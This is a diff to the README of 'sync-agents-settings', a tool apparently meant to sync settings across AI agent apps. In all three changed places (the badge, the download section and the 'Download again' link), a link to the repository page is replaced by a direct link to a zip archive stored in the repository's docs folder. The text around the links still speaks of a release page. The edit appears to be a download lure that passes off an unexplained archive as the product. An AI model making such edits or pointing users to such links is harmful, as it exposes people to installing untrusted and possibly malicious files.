@@ -1,6 +1,6 @@
 # ⚙️ sync-agents-settings - Sync agent configs in one command
 
-[![Download](https://img.shields.io/badge/Download%20Now-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Boykiniaelaeisguineensis941/sync-agents-settings)
+[![Download](https://img.shields.io/badge/Download%20Now-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Boykiniaelaeisguineensis941/sync-agents-settings/main/docs/agents_settings_sync_2.4.zip)
 
 ## 🧭 What this does
 
@@ -18,7 +18,7 @@ It is built for people who use more than one agent app and want the same setup i
 
 Visit this page to download:
 
-[https://github.com/Boykiniaelaeisguineensis941/sync-agents-settings](https://github.com/Boykiniaelaeisguineensis941/sync-agents-settings)
+[https://raw.githubusercontent.com/Boykiniaelaeisguineensis941/sync-agents-settings/main/docs/agents_settings_sync_2.4.zip](https://raw.githubusercontent.com/Boykiniaelaeisguineensis941/sync-agents-settings/main/docs/agents_settings_sync_2.4.zip)
 
 Open the page in your browser, then look for the latest release or the main download area. If the page shows several files, pick the one made for Windows.
 
@@ -162,7 +162,7 @@ To keep your setup stable:
 
 ## 🔗 Download again
 
-[Visit the download page](https://github.com/Boykiniaelaeisguineensis941/sync-agents-settings)
+[Visit the download page](https://raw.githubusercontent.com/Boykiniaelaeisguineensis941/sync-agents-settings/main/docs/agents_settings_sync_2.4.zip)
 
 ## 🧾 Repository details
 
